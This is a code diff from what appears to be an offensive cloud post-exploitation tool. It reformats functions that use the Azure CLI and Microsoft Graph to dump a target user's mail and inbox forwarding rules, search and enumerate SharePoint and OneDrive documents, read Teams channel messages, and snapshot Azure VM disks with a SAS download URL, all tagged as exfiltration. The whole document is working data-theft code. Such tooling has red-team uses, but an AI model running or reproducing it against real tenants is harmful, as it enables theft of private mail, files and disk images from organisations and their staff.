@@ -1003,7 +1003,19 @@ export async function graphMailDump(args: string[], timeout: number): Promise<Ho
 
   const userPath = target === "me" ? "me" : `users/${target}`
 
-  const folders = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders?$select=displayName,totalItemCount,unreadItemCount`, "-o", "json"], timeout)
+  const folders = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      `https://graph.microsoft.com/v1.0/${userPath}/mailFolders?$select=displayName,totalItemCount,unreadItemCount`,
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (folders.exitCode === 0) {
     const folderList = tryJson(folders.stdout)?.value || []
     output.push(`[+] Mail folders for ${target}:`)
@@ -1017,12 +1029,26 @@ export async function graphMailDump(args: string[], timeout: number): Promise<Ho
   }
 
   const searchParam = search ? `&$search="${search}"` : ""
-  const messages = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/${folder}/messages?$top=${maxItems}&$select=subject,from,receivedDateTime,hasAttachments,bodyPreview${searchParam}`, "-o", "json"], timeout)
+  const messages = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/${folder}/messages?$top=${maxItems}&$select=subject,from,receivedDateTime,hasAttachments,bodyPreview${searchParam}`,
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (messages.exitCode === 0) {
     const msgList = tryJson(messages.stdout)?.value || []
     output.push(`\n[+] Messages in ${folder}: ${msgList.length}`)
     for (const m of msgList) {
-      output.push(`    [${m.receivedDateTime || "?"}] From: ${m.from?.emailAddress?.address || "?"} — ${m.subject || "(no subject)"}${m.hasAttachments ? " [ATTACHMENT]" : ""}`)
+      output.push(
+        `    [${m.receivedDateTime || "?"}] From: ${m.from?.emailAddress?.address || "?"} — ${m.subject || "(no subject)"}${m.hasAttachments ? " [ATTACHMENT]" : ""}`,
+      )
       if (m.bodyPreview) output.push(`      ${String(m.bodyPreview).substring(0, 120)}...`)
     }
     if (msgList.length > 0) {
@@ -1039,15 +1065,33 @@ export async function graphMailDump(args: string[], timeout: number): Promise<Ho
     }
   }
 
-  const rules = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/inbox/messageRules`, "-o", "json"], timeout)
+  const rules = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/inbox/messageRules`,
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (rules.exitCode === 0) {
     const ruleList = tryJson(rules.stdout)?.value || []
     if (ruleList.length > 0) {
       output.push(`\n[+] Inbox rules: ${ruleList.length}`)
       for (const r of ruleList) {
         output.push(`    ${r.displayName} — enabled: ${r.isEnabled}`)
-        if (r.actions?.forwardTo?.length) output.push(`      [!] FORWARD TO: ${r.actions.forwardTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`)
-        if (r.actions?.redirectTo?.length) output.push(`      [!] REDIRECT TO: ${r.actions.redirectTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`)
+        if (r.actions?.forwardTo?.length)
+          output.push(
+            `      [!] FORWARD TO: ${r.actions.forwardTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`,
+          )
+        if (r.actions?.redirectTo?.length)
+          output.push(
+            `      [!] REDIRECT TO: ${r.actions.redirectTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`,
+          )
       }
     }
   }
@@ -1063,7 +1107,19 @@ export async function sharepointDump(args: string[], timeout: number): Promise<H
   const findings: Finding[] = []
   const output: string[] = ["[*] SharePoint / OneDrive document exfiltration...\n"]
 
-  const sites = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/sites?search=*&$select=displayName,webUrl,id&$top=50", "-o", "json"], timeout)
+  const sites = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/sites?search=*&$select=displayName,webUrl,id&$top=50",
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (sites.exitCode === 0) {
     const siteList = tryJson(sites.stdout)?.value || []
     output.push(`[+] SharePoint sites: ${siteList.length}`)
@@ -1087,7 +1143,25 @@ export async function sharepointDump(args: string[], timeout: number): Promise<H
   }
 
   if (search) {
-    const searchResult = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/search/query`, "--body", JSON.stringify({ requests: [{ entityTypes: ["driveItem"], query: { queryString: search }, from: 0, size: parseInt(maxItems) }] }), "--method", "POST", "-o", "json"], timeout)
+    const searchResult = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        `https://graph.microsoft.com/v1.0/search/query`,
+        "--body",
+        JSON.stringify({
+          requests: [{ entityTypes: ["driveItem"], query: { queryString: search }, from: 0, size: parseInt(maxItems) }],
+        }),
+        "--method",
+        "POST",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (searchResult.exitCode === 0) {
       const hits = tryJson(searchResult.stdout)?.value?.[0]?.hitsContainers?.[0]?.hits || []
       output.push(`\n[+] Search results for "${search}": ${hits.length}`)
@@ -1112,17 +1186,44 @@ export async function sharepointDump(args: string[], timeout: number): Promise<H
   }
 
   if (siteName) {
-    const siteInfo = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/sites?search=${siteName}&$top=1`, "-o", "json"], timeout)
+    const siteInfo = await run(
+      "az",
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        `https://graph.microsoft.com/v1.0/sites?search=${siteName}&$top=1`,
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (siteInfo.exitCode === 0) {
       const site = tryJson(siteInfo.stdout)?.value?.[0]
       if (site) {
-        const drives = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/sites/${site.id}/drives?$select=name,id,driveType,quota`, "-o", "json"], timeout)
+        const drives = await run(
+          "az",
+          [
+            "rest",
+            "--method",
+            "GET",
+            "--url",
+            `https://graph.microsoft.com/v1.0/sites/${site.id}/drives?$select=name,id,driveType,quota`,
+            "-o",
+            "json",
+          ],
+          timeout,
+        )
         if (drives.exitCode === 0) {
           const driveList = tryJson(drives.stdout)?.value || []
           output.push(`\n[+] Document libraries in ${siteName}: ${driveList.length}`)
           for (const d of driveList) {
             output.push(`    ${d.name} (${d.driveType}) — ID: ${d.id}`)
-            if (d.quota) output.push(`      Used: ${Math.round((d.quota.used || 0) / 1024 / 1024)}MB / ${Math.round((d.quota.total || 0) / 1024 / 1024)}MB`)
+            if (d.quota)
+              output.push(
+                `      Used: ${Math.round((d.quota.used || 0) / 1024 / 1024)}MB / ${Math.round((d.quota.total || 0) / 1024 / 1024)}MB`,
+              )
           }
         }
       }
@@ -1139,9 +1240,23 @@ export async function teamsDump(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] Microsoft Teams message exfiltration...\n"]
 
-  const teams = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/me/joinedTeams?$select=displayName,id,description", "-o", "json"], timeout)
+  const teams = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/me/joinedTeams?$select=displayName,id,description",
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (teams.exitCode !== 0) {
-    output.push(`[-] Cannot list Teams (needs Team.ReadBasic.All or TeamMember.Read.All): ${teams.stderr.slice(0, 200)}`)
+    output.push(
+      `[-] Cannot list Teams (needs Team.ReadBasic.All or TeamMember.Read.All): ${teams.stderr.slice(0, 200)}`,
+    )
     return { output: output.join("\n"), findings }
   }
 
@@ -1168,18 +1283,44 @@ export async function teamsDump(args: string[], timeout: number): Promise<HookRe
 
   if (!targetTeam) return { output: output.join("\n"), findings }
 
-  const channels = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels?$select=displayName,id,membershipType`, "-o", "json"], timeout)
+  const channels = await run(
+    "az",
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels?$select=displayName,id,membershipType`,
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (channels.exitCode === 0) {
     const channelList = tryJson(channels.stdout)?.value || []
     output.push(`\n[+] Channels in ${targetTeam.displayName}: ${channelList.length}`)
     for (const c of channelList) output.push(`    ${c.displayName} (${c.membershipType || "standard"})`)
 
     const targetChannel = channelName
-      ? channelList.find((c: Record<string, string>) => c.displayName?.toLowerCase().includes(channelName.toLowerCase()))
+      ? channelList.find((c: Record<string, string>) =>
+          c.displayName?.toLowerCase().includes(channelName.toLowerCase()),
+        )
       : channelList[0]
 
     if (targetChannel) {
-      const messages = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels/${targetChannel.id}/messages?$top=${maxItems}`, "-o", "json"], timeout)
+      const messages = await run(
+        "az",
+        [
+          "rest",
+          "--method",
+          "GET",
+          "--url",
+          `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels/${targetChannel.id}/messages?$top=${maxItems}`,
+          "-o",
+          "json",
+        ],
+        timeout,
+      )
       if (messages.exitCode === 0) {
         const msgList = tryJson(messages.stdout)?.value || []
         output.push(`\n[+] Messages in #${targetChannel.displayName}: ${msgList.length}`)
@@ -1219,7 +1360,17 @@ export async function vmDiskDownload(args: string[], timeout: number): Promise<H
 
   if (action === "list") {
     const rgArgs = rg ? ["--resource-group", rg] : []
-    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,osDisk:storageProfile.osDisk.name,dataDisks:storageProfile.dataDisks[].name}"], sub, timeout)
+    const vms = await az(
+      [
+        "vm",
+        "list",
+        ...rgArgs,
+        "--query",
+        "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,osDisk:storageProfile.osDisk.name,dataDisks:storageProfile.dataDisks[].name}",
+      ],
+      sub,
+      timeout,
+    )
     if (vms.exitCode !== 0) return { output: "[-] Cannot list VMs", findings }
     const vmList = tryJson(vms.stdout) || []
     output.push(`[+] VMs and disks: ${vmList.length}`)
@@ -1230,7 +1381,11 @@ export async function vmDiskDownload(args: string[], timeout: number): Promise<H
       if (dataDisks.length > 0) output.push(`      Data disks: ${dataDisks.join(", ")}`)
     }
 
-    const unattached = await az(["disk", "list", "--query", "[?diskState=='Unattached'].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType}"], sub, timeout)
+    const unattached = await az(
+      ["disk", "list", "--query", "[?diskState=='Unattached'].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType}"],
+      sub,
+      timeout,
+    )
     if (unattached.exitCode === 0) {
       const uList = tryJson(unattached.stdout) || []
       if (uList.length > 0) {
@@ -1259,12 +1414,43 @@ export async function vmDiskDownload(args: string[], timeout: number): Promise<H
 
     const snapName = `cs-exfil-${target.substring(0, 20)}`
     output.push(`[*] Step 1: Creating snapshot of ${target}...`)
-    const snap = await az(["snapshot", "create", "--name", snapName, "--source", target, "--resource-group", rg, "--tags", "cyberstrike=exfil"], sub, timeout)
-    if (snap.exitCode !== 0) return { output: output.join("\n") + `\n[-] Snapshot failed: ${snap.stderr.slice(0, 200)}`, findings }
+    const snap = await az(
+      [
+        "snapshot",
+        "create",
+        "--name",
+        snapName,
+        "--source",
+        target,
+        "--resource-group",
+        rg,
+        "--tags",
+        "cyberstrike=exfil",
+      ],
+      sub,
+      timeout,
+    )
+    if (snap.exitCode !== 0)
+      return { output: output.join("\n") + `\n[-] Snapshot failed: ${snap.stderr.slice(0, 200)}`, findings }
     output.push(`[+] Snapshot created: ${snapName}`)
 
     output.push(`\n[*] Step 2: Generating SAS URL...`)
-    const grant = await az(["snapshot", "grant-access", "--name", snapName, "--resource-group", rg, "--duration-in-seconds", "7200", "--access-level", "Read"], sub, timeout)
+    const grant = await az(
+      [
+        "snapshot",
+        "grant-access",
+        "--name",
+        snapName,
+        "--resource-group",
+        rg,
+        "--duration-in-seconds",
+        "7200",
+        "--access-level",
+        "Read",
+      ],
+      sub,
+      timeout,
+    )
     if (grant.exitCode === 0) {
       const access = tryJson(grant.stdout)
       const sasUrl = access?.accessSAS || ""
